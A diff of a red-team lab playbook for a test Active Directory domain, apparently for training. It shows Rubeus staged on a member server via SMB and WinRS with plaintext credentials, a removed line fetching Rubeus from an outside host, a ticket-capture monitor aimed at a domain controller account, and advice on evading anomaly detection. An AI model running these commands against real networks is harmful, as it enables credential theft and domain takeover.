@@ -28,15 +28,16 @@ In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. Af
 
 #### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead
 
-**Step 1 — From ws01, open a WinRS session to mbr01 and stage Rubeus:**
+**Step 1 — From `ws01`, copy Rubeus to `mbr01` via SMB (T1570) then start the monitor over WinRS:**
 
 ```powershell
-winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "mkdir C:\Tools\cadre-attack -Force; curl -Uri http://192.168.77.60:8888/Rubeus.exe -OutFile C:\Tools\cadre-attack\Rubeus.exe"
-```
+# Copy from ws01 beachhead to mbr01 (analyst_t1 credentials)
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools\cadre-attack' -Force -Credential $cred | Out-Null
+Copy-Item -Path 'C:\Tools\cadre-attack\Rubeus.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\cadre-attack\Rubeus.exe' -Force -Credential $cred
 
-**Step 2 — Start Rubeus monitor on mbr01 to capture incoming DC auth:**
-
-```powershell
+# Start Rubeus monitor on mbr01 via WinRS
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
@@ -52,10 +53,7 @@ winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\
 winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
 ```
 
-**Why this is more realistic:**
-- Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts.
-- Running coercion from mbr01 means the source IP of the coercing traffic is a **legitimate domain member**, making anomaly detection harder.
-- The listener and the trigger are on the same host, reducing cross-host timing artifacts.
+**Why this matters:** Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts. Running coercion from `mbr01` means the source IP is a legitimate domain member, the listener and trigger are co-located, and the operator must manage tool staging on a beachhead rather than from a clean attacker box.
 
 **Fallback from Kali (single-hop):** If WinRS lateral movement is blocked, the same coercion can be run directly from Kali for lab-learning purposes:
 
